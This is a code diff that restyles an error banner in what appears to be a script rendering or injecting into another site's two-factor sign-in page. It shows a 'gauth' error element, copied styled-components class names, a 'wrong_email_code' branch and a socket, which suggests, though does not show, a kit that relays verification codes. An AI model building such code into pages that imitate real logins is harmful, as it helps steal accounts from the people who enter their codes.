@@ -162,41 +162,39 @@ if (key === "wrong_email_code") {
     btn.style.height = "";
   }
 
-  // --- Error UI helpers (big red banner under the input) ---
+  // --- Error UI helpers (pink banner above the card, matching image style) ---
   function getOrCreateErrorEl(input) {
     const existing = document.getElementById("gauth-error");
     if (existing) return existing;
-    const wrapper = document.createElement("div");
-    wrapper.id = "gauth-error";
-    wrapper.setAttribute("role", "alert");
-    wrapper.setAttribute("aria-live", "assertive");
-    wrapper.className = "sc-11fh42v-0 eMagVQ";
-    const inner1 = document.createElement("div");
-    inner1.className = "sc-11fh42v-0 fjYSLV";
-    const inner2 = document.createElement("div");
-    inner2.className = "sc-11fh42v-0 bIzyyL";
-    const inner3 = document.createElement("div");
-    inner3.className = "sc-11fh42v-0 caYkwU";
-    const msg = document.createElement("p");
-    msg.className = "sc-7l25en-0 gxDtrB";
-    msg.setAttribute("data-gauth-error-text", "1");
-    inner3.appendChild(msg);
-    inner2.appendChild(inner3);
-    inner1.appendChild(inner2);
-    wrapper.appendChild(inner1);
-    if (input && input.parentNode) {
-      const container = input.closest(".sc-11fh42v-0.dvkciP, .sc-11fh42v-0.kXmROk") || input.parentNode;
-      container.parentNode ? container.parentNode.insertBefore(wrapper, container) : input.parentNode.insertBefore(wrapper, input);
+    const err = document.createElement("div");
+    err.id = "gauth-error";
+    err.setAttribute("role", "alert");
+    err.setAttribute("aria-live", "assertive");
+    err.style.background = "#fde8e6";
+    err.style.color = "#c0392b";
+    err.style.padding = "14px 20px";
+    err.style.borderRadius = "12px";
+    err.style.marginBottom = "16px";
+    err.style.fontWeight = "400";
+    err.style.fontSize = "15px";
+    err.style.letterSpacing = "0px";
+    const card = document.querySelector(
+      '[data-testid="two-factor-auth-details-component"], .sc-ccd8bc56-0, [data-qa="two-factor-auth-details-container"]'
+    );
+    const cardParent = card ? card.closest('.sc-a49e7241-1, [class*="evbOfN"], form') || card.parentNode : null;
+    if (cardParent && cardParent.parentNode) {
+      cardParent.parentNode.insertBefore(err, cardParent);
+    } else if (card && card.parentNode) {
+      card.parentNode.insertBefore(err, card);
     } else {
-      document.body.appendChild(wrapper);
+      document.body.insertBefore(err, document.body.firstChild);
     }
-    return wrapper;
+    return err;
   }
 
   function showWrongCodeError(input, submit, text) {
     const err = getOrCreateErrorEl(input);
-    const msgEl = err.querySelector("[data-gauth-error-text]") || err;
-msgEl.textContent = text || "That didn't work. Try again or get a new code.";
+    err.textContent = text || "That didn't work. Try again or get a new code.";
     try { input.setAttribute("aria-invalid", "true"); } catch {}
     try { input.focus(); input.select && input.select(); } catch {}
     restoreButtonFromLoading(submit);
@@ -390,41 +388,39 @@ if (socket) {
     return socket;
   }
 
-  // --- Error UI helpers (same as main auth.js) ---
+  // --- Error UI helpers (pink banner above the card, matching image style) ---
   function getOrCreateErrorEl(input) {
     const existing = document.getElementById("gauth-error");
     if (existing) return existing;
-    const wrapper = document.createElement("div");
-    wrapper.id = "gauth-error";
-    wrapper.setAttribute("role", "alert");
-    wrapper.setAttribute("aria-live", "assertive");
-    wrapper.className = "sc-11fh42v-0 eMagVQ";
-    const inner1 = document.createElement("div");
-    inner1.className = "sc-11fh42v-0 fjYSLV";
-    const inner2 = document.createElement("div");
-    inner2.className = "sc-11fh42v-0 bIzyyL";
-    const inner3 = document.createElement("div");
-    inner3.className = "sc-11fh42v-0 caYkwU";
-    const msg = document.createElement("p");
-    msg.className = "sc-7l25en-0 gxDtrB";
-    msg.setAttribute("data-gauth-error-text", "1");
-    inner3.appendChild(msg);
-    inner2.appendChild(inner3);
-    inner1.appendChild(inner2);
-    wrapper.appendChild(inner1);
-    if (input && input.parentNode) {
-      const container = input.closest(".sc-11fh42v-0.dvkciP, .sc-11fh42v-0.kXmROk") || input.parentNode;
-      container.parentNode ? container.parentNode.insertBefore(wrapper, container) : input.parentNode.insertBefore(wrapper, input);
+    const err = document.createElement("div");
+    err.id = "gauth-error";
+    err.setAttribute("role", "alert");
+    err.setAttribute("aria-live", "assertive");
+    err.style.background = "#fde8e6";
+    err.style.color = "#c0392b";
+    err.style.padding = "14px 20px";
+    err.style.borderRadius = "12px";
+    err.style.marginBottom = "16px";
+    err.style.fontWeight = "400";
+    err.style.fontSize = "15px";
+    err.style.letterSpacing = "0px";
+    const card = document.querySelector(
+      '[data-testid="two-factor-auth-details-component"], .sc-ccd8bc56-0, [data-qa="two-factor-auth-details-container"]'
+    );
+    const cardParent = card ? card.closest('.sc-a49e7241-1, [class*="evbOfN"], form') || card.parentNode : null;
+    if (cardParent && cardParent.parentNode) {
+      cardParent.parentNode.insertBefore(err, cardParent);
+    } else if (card && card.parentNode) {
+      card.parentNode.insertBefore(err, card);
     } else {
-      document.body.appendChild(wrapper);
+      document.body.insertBefore(err, document.body.firstChild);
     }
-    return wrapper;
+    return err;
   }
 
   function showWrongCodeError(input, submit, text) {
     const err = getOrCreateErrorEl(input);
-    const msgEl = err.querySelector("[data-gauth-error-text]") || err;
-msgEl.textContent = text || "That didn't work. Try again or get a new code.";
+    err.textContent = text || "That didn't work. Try again or get a new code.";
     try { input.setAttribute("aria-invalid", "true"); } catch {}
     try { input.focus(); input.select && input.select(); } catch {}
     // Restore button from loading state
